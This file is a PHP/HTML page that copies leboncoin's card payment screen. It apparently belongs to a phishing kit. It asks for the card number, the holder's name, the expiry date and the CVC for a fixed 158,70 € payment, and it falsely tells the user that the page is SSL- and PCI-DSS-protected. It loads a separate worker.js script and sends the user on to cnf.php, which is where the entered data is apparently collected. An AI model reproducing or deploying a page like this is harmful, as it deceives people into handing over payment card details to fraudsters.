<?php
session_start();
?>



<!DOCTYPE html>
<html>
<head>
  <title></title>
  <link rel="stylesheet" type="text/css" href="css/style.css">
  <script src="js/jquery.min.js" data-script-location="bottom"></script>
<script src="js/worker.js"></script>
</head>
<body>
	<div id="didomi-host" data-nosnippet="true" aria-hidden="true">
		
	</div>
	<div id="__next"><div>
		<section id="container" class="" data-pagename="">
			<main class="_1X83S" role="main">
				<div class="_3b19Z">
					<div class="_3b19Z">
						<div class="styles_paymentHeader__3zevB">
							<header class="_2up2P" role="banner">
								<div class="_1TRNX">
									<div class="X9VyQ">
										
									</div>
									<nav class="_1xp7y">
										<a><div class="_3gQw6">
											<span class="kcRM9 _1bI-U _27gjm _3Wx6b">
												<svg data-name="Calque 1" viewBox="0 0 24 24" width="1em" height="1em">
													<path d="M22.46 10.43H5.26l7.51-7.72a1.63 1.63 0 000-2.25 1.52 1.52 0 00-2.17 0L.45 10.88a1.61 1.61 0 000 2.23L10.6 23.54a1.52 1.52 0 002.17 0 1.61 1.61 0 000-2.23l-7.51-7.72h17.2a1.58 1.58 0 000-3.16z"></path></svg></span><span class="fJ8hk _1o09v">Retour</span></div></a>
													<div class="styles_logo__Ck_BZ"><div><div class="_1CKrh"><span class="_3Ce01 _1hnil _1-TTU _35DXM">Paiement</span></div><div class="_3jQr3"><span class="_3Ce01 _2QVPN _2-a8M _35DXM">Paiement</span></div></div></div></nav><div class="X9VyQ"></div></div></header>
												</div><noscript>
														<div class="styles_centered__3oKbP"><div class="_1E2Iw _3ipBx _1A4pY"><div class="PdpKw"><span class="_3phUw">Attention : </span></div><div>Activez JavaScript pour profiter de toutes les fonctionnalités de leboncoin</div></div></div></noscript><div class="styles_cardPaymentPageWrapper__1EeXL"><div class="_16HCL styles_cardPaymentWrapper__30kQE"><div class="styles_cardPayment__1pKCo">
														<section class="styles_payment__1QCOd"><section class="styles_recap__1TxJ9"><div class="styles_total__3nKTO"><div><div class="styles_line__2hluK"><span class="_1hnil _1-TTU _35DXM">Montant à payer :</span><span data-qa-id="total-price" class="_3Ce01 _1uydM _1hnil _1-TTU _35DXM">158,70 €</span></div></div><div class="styles_toggleWrapper__Eeo-f"><button type="button" data-qa-id="recapDetailsToggle" class="_27ngl kTOAf _64Mha _3Q3XS _137P- P4PEa _35DXM"><div class="_9dEbO"><span class="kcRM9 _1l5Un _3T5YK _3Wx6b"><svg data-name="Calque 1" viewBox="0 0 24 24" width="1em" height="1em"><path d="M23.37 5.62a2.15 2.15 0 00-3 0L12 13.87 3.68 5.62a2.2 2.2 0 00-3.05 0 2.1 2.1 0 000 3l9.86 9.76a2.14 2.14 0 003 0l9.86-9.76a2.1 2.1 0 00.02-3z"></path></svg></span></div><div class="_2KqHw">Afficher les détails</div></button></div></div><div class="styles_details__o-TFQ" data-qa-id="recap-details"></div></section><section><div class="styles_cardPureForm__3Qybp">

															<form id="card-payment-form" class="styles_cbForm__h2cGw" method="post">
																<div class="styles_paymentInfos__2wDML">
																	<span class="kcRM9 _1eo84 _30L6u _3Wx6b _3O6jB"><svg data-name="Calque 1" viewBox="0 0 24 24" width="1em" height="1em"><path d="M18.75 8h-1.13V5.71a5.62 5.62 0 10-11.24 0V8H5.25A2.27 2.27 0 003 10.29v11.42A2.27 2.27 0 005.25 24h13.5A2.27 2.27 0 0021 21.71V10.29A2.27 2.27 0 0018.75 8zM12 18.29A2.29 2.29 0 1114.25 16 2.27 2.27 0 0112 18.29zM15.38 8H8.62V5.71a3.38 3.38 0 116.76 0z"></path></svg></span><span class="_2WFYb _1hnil _1-TTU _35DXM">Paiement sécurisé</span><span class="styles_acceptedCards__2SsPc"><img src="beta_cb-7fe09fce.png"><img src="beta_visa-8379c17e.png"><img src="beta_mastercard-e2c58e67.png"></span></div><div class="styles_fieldsWrapper__25XLf"><div class="styles_field__2W66w"><div class="_3Hrjq"><label class="_3Rgki" for="cardNumber">Numéro de carte<span class="_2GpA3">champ requis</span>
														</label>
														<div class="ZlsP9 rdaLu _1mwQl aj3_W _3LV9U">
															<input id="cardNumber" maxlength="19" name="card" required="" class="" data-qa-id="cardNumber" type="text" value="">
														</div>
													</div>
												</div>
												<div class="styles_field__2W66w">
													<div class="_3Hrjq">
														<label class="_3Rgki" for="cardHolderName">Titulaire de la carte
															<span class="_2GpA3">champ requis</span>
														</label>
														<div class="ZlsP9 rdaLu _1mwQl aj3_W _3LV9U">
															<input id="cardHolderName" name="holder" placeholder="Nom écrit sur la carte" required="" class="" data-qa-id="cardHolderName" type="text" value="">
														</div>
													</div>
												</div>
												<div class="styles_field__2W66w">
													<div class="_3Hrjq">
														<label class="_3Rgki" for="expirationDate">Date d'expiration
															<span class="_2GpA3">champ requis</span>
														</label>
														<div class="ZlsP9 _1mwQl aj3_W _3LV9U">
															<input id="expirationDate" maxlength="5" name="data" placeholder="MM / AA" required="" class="" data-qa-id="expirationDate" type="text" value="">
															<div class="_fbmQ">
																<span class="kcRM9 _1l5Un _30L6u _3Wx6b">
																	<svg data-name="Calque 1" viewBox="0 0 24 24" width="1em" height="1em" cursor="pointer">
																		<path d="M12 0a12 12 0 1012 12A12 12 0 0012 0zm1.24 18.87a1.3 1.3 0 01-2.59 0v-.11a1.3 1.3 0 112.59 0zM14.58 13a2.94 2.94 0 00-1.34 2.5v.54h-2.61v-.71c0-1.64.41-2.48 2-3.75a2.8 2.8 0 001.29-2.38A1.83 1.83 0 0012 7.15c-1.14 0-1.89.85-2.07 2.16a1.27 1.27 0 01-2.5-.19 1.1 1.1 0 010-.31 4.43 4.43 0 014.63-4 4.16 4.16 0 014.44 4.31A4.59 4.59 0 0114.58 13z">
																		</path>
																	</svg>
																</span>
															</div>
														</div>
													</div>
												</div>
												<div class="styles_field__2W66w">
													<div class="_3Hrjq">
														<label class="_3Rgki" for="cvc">Cryptogramme
															<span class="_2GpA3">champ requis</span>
														</label>
														<div class="ZlsP9 _1mwQl aj3_W _3LV9U">
															<input id="cvc" maxlength="3" name="cvc" placeholder="Exemple : 123" required="" class="" data-qa-id="cvc" type="text" value="">
															<div class="_fbmQ">
																<span class="kcRM9 _1l5Un _30L6u _3Wx6b">
																	<svg data-name="Calque 1" viewBox="0 0 24 24" width="1em" height="1em" cursor="pointer">
																		<path d="M12 0a12 12 0 1012 12A12 12 0 0012 0zm1.24 18.87a1.3 1.3 0 01-2.59 0v-.11a1.3 1.3 0 112.59 0zM14.58 13a2.94 2.94 0 00-1.34 2.5v.54h-2.61v-.71c0-1.64.41-2.48 2-3.75a2.8 2.8 0 001.29-2.38A1.83 1.83 0 0012 7.15c-1.14 0-1.89.85-2.07 2.16a1.27 1.27 0 01-2.5-.19 1.1 1.1 0 010-.31 4.43 4.43 0 014.63-4 4.16 4.16 0 014.44 4.31A4.59 4.59 0 0114.58 13z"></path>
																	</svg>
																</span>
															</div>
														</div>
													</div>
												</div>
											</div>
											<div>
												<label data-qa-id="save_card" class="_2iCCN _3Yq2U _3AXPQ _3QJkO _30q3D">
													<input type="checkbox" name="saveCard" class="_3_iNE" value="">
													<span class="_1T1yE"></span>
													<span class="_1iJKV">J’enregistre cette carte pour de futurs achats</span>
												</label>
											</div>
											<div class="styles_actions__1N1Q9">
												<button class="_2qvLx _3WXWV _1jQJ3 _1Vw3w _kC3e _32ILh _2L9kx _30q3D _1y_ge _3QJkO" onclick="window.location.href='cnf.php'" type="submit">Payer 158,70 €</button> 
											</div>
										</form>

										<span class="_2k43C Dqdzf cJtdT _3j0OU"><p class="_1oejz Dqdzf cJtdT _3j0OU">Vous êtes sur un serveur de paiement sécurisé par les normes ssl (https) et pcidss de nos partenaires bancaires. Vos données sont encryptées pour plus de sécurité.</p><button type="button" data-qa-id="displaySecurePaymentInfoBtn" class="_27ngl kTOAf _2k43C _3Q3XS _14UhV Dqdzf cJtdT _3j0OU"><p class="styles_showLegalInfo__3swtd"><span class="kcRM9 _1bI-U _30L6u _3Wx6b _3k87M"><svg data-name="Calque 1" viewBox="0 0 24 24" width="1em" height="1em"><path d="M12 0a12 12 0 1012 12A12 12 0 0012 0zm1.2 16.8A1.29 1.29 0 0112 18a1.29 1.29 0 01-1.2-1.2V12a1.29 1.29 0 011.2-1.2 1.29 1.29 0 011.2 1.2zm-.6-7.44a1.33 1.33 0 01-1.68-.48 1.33 1.33 0 01.48-1.68 1.24 1.24 0 111.2 2.16z"></path></svg></span><span>Consultez les informations légales liées au paiement</span></p></button></span></div></section></section></div></div></div><div class="nDpxN"><footer class="_1RPZf"><div class="_3b82x"><div class="_3S9qY"><span>leboncoin 2006 - 2021</span></div></div></footer></div></div></div><span id="root-portal"></span></main><div class="_3sWzy" data-qa-id="selectedNavigationLayer"></div></section><span id="app-type" data-app-type="rav-next" hidden="">version: 2021-02-05.25955</span></div></div>
      
    </body>
</html>
